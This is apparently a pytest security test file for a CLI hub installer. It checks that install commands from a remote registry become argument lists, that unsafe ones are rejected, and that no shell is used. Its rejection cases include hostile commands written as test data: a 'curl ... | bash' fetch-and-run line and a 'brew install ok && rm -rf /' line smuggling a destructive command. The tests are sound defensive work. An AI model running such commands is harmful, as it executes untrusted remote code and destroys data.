"""Security tests for commands originating in the remote CLI registry."""

import sys
from unittest.mock import patch

import pytest

from cli_hub._command_policy import RegistryCommandRejected, registry_command_argv
from cli_hub.installer import _run_command


def cli(manager, command):
    return {"package_manager": manager, "install_cmd": command}


def test_brew_install_is_converted_to_argv():
    entry = cli("brew", "brew install --cask 1password-cli")
    assert registry_command_argv(entry, "install") == [
        "brew", "install", "--cask", "1password-cli"
    ]


def test_pip_install_uses_current_interpreter():
    entry = cli("pip", "python3 -m pip install git+https://github.com/example/tool.git")
    assert registry_command_argv(entry, "install") == [
        sys.executable, "-m", "pip", "install", "git+https://github.com/example/tool.git"
    ]


@pytest.mark.parametrize(
    ("manager", "command"),
    [
        ("script", "curl -s https://example.test/install | bash"),
        ("brew", "brew install ok && rm -rf /"),
        ("brew", "python3 -c 'print(1)'"),
        ("pip", "python3 -m pip install --target /tmp tool"),
        ("unknown", "echo hello"),
    ],
)
def test_untrusted_command_shapes_are_rejected(manager, command):
    with pytest.raises(RegistryCommandRejected):
        registry_command_argv(cli(manager, command), "install")


def test_runner_never_invokes_a_shell_for_operator_commands():
    with patch("cli_hub.installer.subprocess.run") as run:
        result = _run_command("curl -s https://example.test/install | bash")
    run.assert_not_called()
    assert result.returncode == 126


def test_runner_passes_plain_commands_as_argv():
    with patch("cli_hub.installer.subprocess.run") as run:
        _run_command("brew install tool")
    run.assert_called_once()
    assert run.call_args.args[0] == ["brew", "install", "tool"]
    assert "shell" not in run.call_args.kwargs
